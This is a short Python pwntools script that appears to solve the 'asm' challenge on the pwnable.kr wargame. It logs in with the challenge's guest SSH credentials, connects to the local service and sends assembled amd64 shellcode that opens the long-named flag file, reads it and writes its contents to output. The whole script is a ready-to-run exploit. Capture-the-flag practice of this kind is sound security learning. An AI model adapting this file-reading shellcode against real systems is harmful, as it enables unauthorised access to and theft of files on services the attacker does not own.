from pwn import *
conn = ssh('asm','pwnable.kr',password = 'guest',port = 2222)
l_coon = conn.connect_remote('127.0.0.1',9026)
context(arch = 'amd64',os = 'linux')
shellcode=''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp',0,0)
shellcode += shellcraft.read('rax','rsp',1000)
shellcode += shellcraft.write(1,'rsp',1000)
print l_coon.recv()
l_coon.send(asm(shellcode))
log.success(l_coon.readline())
